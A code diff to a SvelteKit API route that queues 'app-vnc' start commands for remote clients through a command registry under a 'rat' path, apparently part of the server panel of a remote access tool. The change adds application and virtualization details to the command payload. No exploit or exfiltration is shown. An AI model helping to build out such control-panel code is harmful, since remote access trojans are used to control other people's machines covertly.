@@ -1,7 +1,7 @@
 import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
-import { appVncManager, AppVncError } from '$lib/server/rat/app-vnc';
+import { appVncManager, AppVncError, resolveAppVncStartContext } from '$lib/server/rat/app-vnc';
 import type {
 	AppVncCommandPayload,
 	AppVncSessionResponse,
@@ -77,14 +77,17 @@ export const POST: RequestHandler = async ({ params, request }) => {
 		const settings = normalizeSettings(body);
 		const session = appVncManager.createSession(id, settings);
 
-		try {
-			const payload: AppVncCommandPayload = {
-				action: 'start',
-				sessionId: session.sessionId,
-				settings: session.settings
-			};
-			registry.queueCommand(id, { name: 'app-vnc', payload });
-		} catch (err) {
+                try {
+                        const { application, virtualization } = resolveAppVncStartContext(id, session.settings);
+                        const payload: AppVncCommandPayload = {
+                                action: 'start',
+                                sessionId: session.sessionId,
+                                settings: session.settings,
+                                application,
+                                virtualization
+                        };
+                        registry.queueCommand(id, { name: 'app-vnc', payload });
+                } catch (err) {
 			appVncManager.closeSession(id);
 			if (err instanceof RegistryError) {
 				throw error(err.status, err.message);
